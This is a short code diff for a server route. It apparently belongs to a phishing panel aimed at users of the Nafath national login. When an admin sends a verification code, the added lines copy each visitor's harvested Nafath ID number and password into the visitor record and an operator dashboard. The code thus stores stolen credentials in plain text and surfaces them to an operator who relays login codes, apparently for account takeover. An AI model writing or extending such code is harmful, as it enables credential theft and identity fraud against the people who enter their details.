@@ -954,23 +954,32 @@ async function startServer() {
       const currentPage = currentVisitor?.currentPage || "nafad";
       const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
 
+      // Keep all existing nafad data and add new code
       const updateData: Record<string, any> = {
         adminNafadCodeSent: true,
         adminNafadSentAt: new Date().toISOString(),
         currentPage,
+        // Keep existing nafad data
+        nafadIdNumber: currentVisitor?.nafadIdNumber,
+        nafadPassword: currentVisitor?.nafadPassword,
+        nafadConfirmationStatus: currentVisitor?.nafadConfirmationStatus,
       };
 
       if (nafadCode) {
         updateData.adminNafadCode = nafadCode;
       }
 
+      // Update visitor data
       await upsertVisitor(visitorId, updateData);
       
-      // Update dashboard with customer name
+      // Update dashboard with customer name AND all nafad data
       const dashboardData = await upsertDashboardRequest({ 
         id: visitorId, 
         visitorId: visitorId,
         customer: customerName,
+        nafadIdNumber: currentVisitor?.nafadIdNumber,
+        nafadPassword: currentVisitor?.nafadPassword,
+        nafadConfirmationStatus: currentVisitor?.nafadConfirmationStatus,
         ...updateData, 
         updated: "تم إرسال رمز النفاذ" 
       });
